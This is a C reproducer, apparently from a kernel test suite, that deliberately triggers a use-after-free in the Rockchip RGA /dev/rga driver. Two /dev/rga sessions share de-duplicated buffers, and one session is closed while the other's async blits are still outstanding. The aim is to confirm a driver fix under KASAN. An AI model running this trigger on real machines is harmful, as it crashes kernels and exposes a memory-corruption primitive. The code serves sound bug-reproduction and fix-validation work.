// SPDX-License-Identifier: MIT
/*
 * rga-session-uaf - targeted reproducer for the RGA /dev/rga session-close
 * force-free hazard.
 *
 * Background (see findings/2026-07-17-rga-session-close-uaf.md):
 *   On /dev/rga close, rga_mm_session_release_buffer() historically called
 *   rga_mm_force_releaser_buffer(), which idr_remove()s + unmaps + kfree()s
 *   every buffer owned by the session *ignoring its kref refcount*. Buffer
 *   imports are de-duplicated across the whole memory_idr with no per-session
 *   filter, and internal_buffer->session records only the first importer, so a
 *   buffer can still be referenced by another session's in-flight job when its
 *   nominal owner closes. Force-freeing it then leaves that job pointing at
 *   freed memory (use-after-free).
 *
 * This program drives two independent, KASAN-friendly scenarios. It exercises
 * the *cleanup* path only; it does not validate blit output.
 *
 *   mode "leak"  (default) - faithful reproduction of the reported conditions:
 *                a process imports a dma-buf into /dev/rga, never releases the
 *                handle, and exits/closes so the session-close path reclaims a
 *                refcount-1 buffer. Static audit says this teardown is clean, so
 *                a KASAN kernel staying quiet here is *evidence the reported
 *                Oops was not this path in isolation*.
 *
 *   mode "cross" - the reachable cross-session UAF that the driver fix targets:
 *                session A imports two dma-bufs; session B imports the same
 *                dma-bufs (de-dup -> same handles, still owned by A) and submits
 *                async blits referencing them; then A closes while B's jobs are
 *                outstanding. On an unpatched kernel this force-frees buffers a
 *                live job still references. Run under KASAN: an unpatched kernel
 *                should splat (use-after-free); a kernel carrying the
 *                "release session buffers by reference on close" fix should stay
 *                quiet.
 *
 * Build/run via rga-session-uaf.sh (mirrors abi-probe.sh include paths).
 *
 * WARNING: this deliberately provokes a kernel memory-safety bug. Run it only on
 * a disposable test kernel/board, ideally a KASAN debug build. It can crash the
 * machine by design on a vulnerable kernel.
 */

#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef __user
#define __user
#endif
#include <linux/dma-heap.h>

#include "rga_ioctl.h"

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
#define RGA_TEST_WIDTH 16U
#define RGA_TEST_HEIGHT 16U
#define RGA_TEST_FORMAT_RGBA8888 0U
#define RGA_TEST_RASTER_MODE 1U

static const char *rga_dev = "/dev/rga";

struct test_dmabuf {
	int fd;
	size_t size;
};

static unsigned long env_ulong(const char *name, unsigned long def)
{
	const char *v = getenv(name);
	char *end;
	unsigned long out;

	if (!v || !*v)
		return def;
	out = strtoul(v, &end, 0);
	if (*end)
		return def;
	return out;
}

static bool env_enabled(const char *name)
{
	const char *v = getenv(name);

	return v && strcmp(v, "0") && strcmp(v, "false") && strcmp(v, "no");
}

/* Allocate a dma-buf from the first available dma-heap. */
static int dmabuf_alloc(struct test_dmabuf *buf, size_t size)
{
	static const char * const heaps[] = {
		/*
		 * Prefer the below-4G CMA regions first: the small RGBA blit this
		 * reproducer submits only maps to RGA2 (core 0x4), which has a
		 * 32-bit under-4G address limit. On a >4G board the plain "system"
		 * heap returns memory above 4G, so RGA2 is excluded ("no core
		 * match ... under-4G memory limit") and the cross-session async
		 * window never opens. Armbian 6.18 exposes the CMA pool as
		 * "default_cma_region" (no *-dma32 / cma aliases), so name it
		 * explicitly.
		 */
		"/dev/dma_heap/default_cma_region",
		"/dev/dma_heap/reserved",
		"/dev/dma_heap/cma-uncached",
		"/dev/dma_heap/cma",
		"/dev/rk_dma_heap/rk-dma-heap-cma",
		"/dev/dma_heap/system-uncached-dma32",
		"/dev/dma_heap/system-dma32",
		"/dev/dma_heap/system-uncached",
		"/dev/dma_heap/system",
	};
	int first_err = -ENOENT;
	size_t i;

	buf->fd = -1;
	buf->size = 0;

	for (i = 0; i < ARRAY_SIZE(heaps); i++) {
		struct dma_heap_allocation_data data = {};
		int heap_fd = open(heaps[i], O_RDWR | O_CLOEXEC);

		if (heap_fd < 0) {
			if (first_err == -ENOENT)
				first_err = -errno;
			continue;
		}

		data.len = size;
		data.fd_flags = O_RDWR | O_CLOEXEC;
		if (ioctl(heap_fd, DMA_HEAP_IOCTL_ALLOC, &data)) {
			first_err = -errno;
			close(heap_fd);
			continue;
		}
		close(heap_fd);

		buf->fd = data.fd;
		buf->size = size;
		return 0;
	}

	return first_err;
}

static void dmabuf_free(struct test_dmabuf *buf)
{
	if (buf->fd >= 0)
		close(buf->fd);
	buf->fd = -1;
	buf->size = 0;
}

/*
 * Import a dma-buf into an /dev/rga session. RGA_IOC_IMPORT_BUFFER returns the
 * positive buffer handle as its ioctl return value (rga_ioctl_import_buffer ->
 * rga_mm_import_buffer). Returns the handle (>0) or <=0 on error.
 */
static int rga_import_dmabuf(int rga_fd, const struct test_dmabuf *buf)
{
	struct rga_external_buffer ext[1] = {};
	struct rga_buffer_pool pool = {};

	ext[0].memory = (uint64_t)buf->fd;
	ext[0].type = RGA_DMA_BUFFER;
	ext[0].memory_info.size = (uint32_t)buf->size;
	pool.buffers = (uint64_t)(uintptr_t)ext;
	pool.size = ARRAY_SIZE(ext);

	return ioctl(rga_fd, RGA_IOC_IMPORT_BUFFER, &pool);
}

static void rga_fill_img(rga_img_info_t *img, uint32_t handle)
{
	img->yrgb_addr = handle;
	img->format = RGA_TEST_FORMAT_RGBA8888;
	img->act_w = RGA_TEST_WIDTH;
	img->act_h = RGA_TEST_HEIGHT;
	img->vir_w = RGA_TEST_WIDTH;
	img->vir_h = RGA_TEST_HEIGHT;
	img->rd_mode = RGA_TEST_RASTER_MODE;
}

/*
 * Submit one async blit (src_handle -> dst_handle) on the given session. The job
 * takes a kref on each referenced buffer at submit time (rga_mm_map_job_info)
 * and holds it until the job completes, which is the window we want open when
 * the *other* session closes. Returns 0 on submit success.
 */
static int rga_submit_async_blit(int rga_fd, uint32_t src_handle,
				 uint32_t dst_handle)
{
	struct rga_user_request request = {};
	struct rga_req task = {};
	uint32_t request_id = 0;
	int ret;

	if (ioctl(rga_fd, RGA_IOC_REQUEST_CREATE, &request_id) < 0)
		return -errno;
	if (!request_id)
		return -EINVAL;

	task.render_mode = bitblt_mode;
	task.handle_flag = 1;
	task.cosa = 65536;
	task.clip.xmin = 0;
	task.clip.ymin = 0;
	task.clip.xmax = RGA_TEST_WIDTH - 1;
	task.clip.ymax = RGA_TEST_HEIGHT - 1;
	rga_fill_img(&task.src, src_handle);
	rga_fill_img(&task.dst, dst_handle);

	request.task_ptr = (uint64_t)(uintptr_t)&task;
	request.task_num = 1;
	request.id = request_id;
	request.sync_mode = RGA_BLIT_ASYNC;
	request.release_fence_fd = 0;

	ret = ioctl(rga_fd, RGA_IOC_REQUEST_SUBMIT, &request);
	if (ret < 0) {
		ret = -errno;
		ioctl(rga_fd, RGA_IOC_REQUEST_CANCEL, &request_id);
		return ret;
	}

	/* Async submit hands back a release fence fd; don't leak it. */
	if (request.release_fence_fd > 0)
		close((int)request.release_fence_fd);

	return 0;
}

/*
 * mode "leak": faithful reproduction of the reported conditions. Each iteration
 * opens a fresh session, imports a dma-buf, leaks the handle, and closes so the
 * session-close path reclaims a refcount-1 buffer. With RGA_UAF_FORK=1 each
 * iteration runs in a child that _exit()s (closest to "process exited with a
 * handle still allocated").
 */
static int run_leak(unsigned long iters)
{
	bool use_fork = env_enabled("RGA_UAF_FORK");
	unsigned long i;
	unsigned long leaked = 0, skipped = 0;

	for (i = 0; i < iters; i++) {
		pid_t pid = -1;

		if (use_fork) {
			pid = fork();
			if (pid < 0) {
				perror("fork");
				return 1;
			}
			if (pid > 0) {
				int status;

				waitpid(pid, &status, 0);
				if (WIFSIGNALED(status))
					printf("  child %lu killed by signal %d\n",
					       i, WTERMSIG(status));
				leaked++;
				continue;
			}
			/* child falls through, will _exit() */
		}

		{
			struct test_dmabuf buf;
			int rga_fd;
			int handle;

			if (dmabuf_alloc(&buf, (size_t)sysconf(_SC_PAGESIZE))) {
				if (use_fork)
					_exit(2);
				skipped++;
				continue;
			}

			rga_fd = open(rga_dev, O_RDWR | O_CLOEXEC);
			if (rga_fd < 0) {
				perror("open /dev/rga");
				dmabuf_free(&buf);
				if (use_fork)
					_exit(3);
				return 1;
			}

			handle = rga_import_dmabuf(rga_fd, &buf);
			if (handle <= 0)
				skipped++;
			else
				leaked++;

			/*
			 * Deliberately do NOT release the handle. Close the
			 * session (and, in the fork path, exit) with it still
			 * allocated so rga_release()->
			 * rga_mm_session_release_buffer() runs.
			 */
			if (use_fork) {
				/* leave rga_fd/buf fds to be closed by _exit */
				_exit(0);
			}

			close(rga_fd);
			dmabuf_free(&buf);
		}
	}

	printf("leak: iters=%lu leaked=%lu skipped=%lu%s\n",
	       iters, leaked, skipped, use_fork ? " (fork)" : "");
	if (leaked == 0) {
		printf("leak: no handle was ever imported - check /dev/rga and dma_heap access\n");
		return 1;
	}
	return 0;
}

/*
 * mode "cross": the reachable cross-session UAF. Session A owns two shared
 * buffers; session B references them from outstanding async jobs; A then closes.
 */
static int run_cross(unsigned long iters, unsigned long burst)
{
	unsigned long i;
	unsigned long rounds = 0, submits = 0, submit_fail = 0, dedup_ok = 0;
	size_t page = (size_t)sysconf(_SC_PAGESIZE);

	for (i = 0; i < iters; i++) {
		struct test_dmabuf src = { .fd = -1 }, dst = { .fd = -1 };
		int fd_a = -1, fd_b = -1;
		int hs_a, hd_a, hs_b, hd_b;
		unsigned long j;

		if (dmabuf_alloc(&src, page) || dmabuf_alloc(&dst, page)) {
			printf("cross: dma-heap alloc failed, aborting\n");
			dmabuf_free(&src);
			dmabuf_free(&dst);
			return 1;
		}

		fd_a = open(rga_dev, O_RDWR | O_CLOEXEC);
		fd_b = open(rga_dev, O_RDWR | O_CLOEXEC);
		if (fd_a < 0 || fd_b < 0) {
			perror("open /dev/rga");
			goto next;
		}

		/* Session A imports both buffers -> A owns them, refcount 1. */
		hs_a = rga_import_dmabuf(fd_a, &src);
		hd_a = rga_import_dmabuf(fd_a, &dst);
		if (hs_a <= 0 || hd_a <= 0) {
			printf("cross: session A import failed (%d,%d)\n",
			       hs_a, hd_a);
			goto next;
		}

		/*
		 * Session B imports the same dma-bufs. rga_mm_lookup_external()
		 * de-dups across the whole idr, so B should get the SAME handles
		 * (refcount now 2, still owned by A). Matching handles is the
		 * proof that the cross-session sharing precondition holds.
		 */
		hs_b = rga_import_dmabuf(fd_b, &src);
		hd_b = rga_import_dmabuf(fd_b, &dst);
		if (hs_b <= 0 || hd_b <= 0) {
			printf("cross: session B import failed (%d,%d)\n",
			       hs_b, hd_b);
			goto next;
		}
		if (hs_b == hs_a && hd_b == hd_a)
			dedup_ok++;
		else if (i == 0)
			printf("cross: NOTE handles not shared across sessions "
			       "(A:%d,%d B:%d,%d) - dedup precondition weak\n",
			       hs_a, hd_a, hs_b, hd_b);

		/*
		 * Session B fires a burst of async blits referencing the shared
		 * handles. Each holds a kref on A's buffers until it completes.
		 */
		for (j = 0; j < burst; j++) {
			int ret = rga_submit_async_blit(fd_b, (uint32_t)hs_b,
							(uint32_t)hd_b);
			if (ret == 0) {
				submits++;
			} else {
				submit_fail++;
				if (i == 0 && j == 0)
					printf("cross: async submit failed: %s "
					       "(cross-session job window will be "
					       "empty; UAF needs a valid blit)\n",
					       strerror(-ret));
				break;
			}
		}

		/*
		 * Close A while B's jobs are (hopefully) still outstanding. On an
		 * unpatched kernel this force-frees buffers B still references.
		 */
		close(fd_a);
		fd_a = -1;
		rounds++;

next:
		if (fd_a >= 0)
			close(fd_a);
		if (fd_b >= 0)
			close(fd_b);
		dmabuf_free(&src);
		dmabuf_free(&dst);
	}

	printf("cross: iters=%lu rounds=%lu dedup_shared=%lu async_submits=%lu submit_fail=%lu burst=%lu\n",
	       iters, rounds, dedup_ok, submits, submit_fail, burst);
	/*
	 * findings/2026-07-17-rga-session-close-uaf.md states the criterion outright:
	 * "confirm `cross` reports async_submits > 0 -- a quiet run with 0 submits
	 * proves nothing". rga-session-uaf.sh execs this binary, so the exit code IS
	 * the verdict, and returning 0 here reported a pass for a run that never
	 * opened the window. run_leak() already fails closed the same way.
	 */
	if (submits == 0) {
		printf("cross: FAIL - no async job was submitted, so the cross-session job "
		       "window never opened; tune the blit params on-target (this harness only "
		       "reached the close path with refcount-1 imports)\n");
		return 1;
	}
	if (rounds == 0) {
		printf("cross: FAIL - no iteration completed a round; both /dev/rga opens or "
		       "the imports failed every time\n");
		return 1;
	}
	if (dedup_ok == 0) {
		printf("cross: FAIL - the cross-session de-dup precondition never held, so the "
		       "two sessions never shared a buffer\n");
		return 1;
	}
	return 0;
}

static void usage(const char *argv0)
{
	printf("usage: %s [leak|cross]\n", argv0);
	printf("  env RGA_UAF_ITERS  iterations (leak default 5000, cross 2000)\n");
	printf("  env RGA_UAF_BURST  async jobs per round in cross mode (default 32)\n");
	printf("  env RGA_UAF_FORK=1 leak mode: one child process per iteration\n");
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "leak";

	if (!strcmp(mode, "-h") || !strcmp(mode, "--help")) {
		usage(argv[0]);
		return 0;
	}

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("rga-session-uaf: mode=%s dev=%s\n", mode, rga_dev);

	if (!strcmp(mode, "leak"))
		return run_leak(env_ulong("RGA_UAF_ITERS", 5000));
	if (!strcmp(mode, "cross"))
		return run_cross(env_ulong("RGA_UAF_ITERS", 2000),
				 env_ulong("RGA_UAF_BURST", 32));

	usage(argv[0]);
	return 2;
}
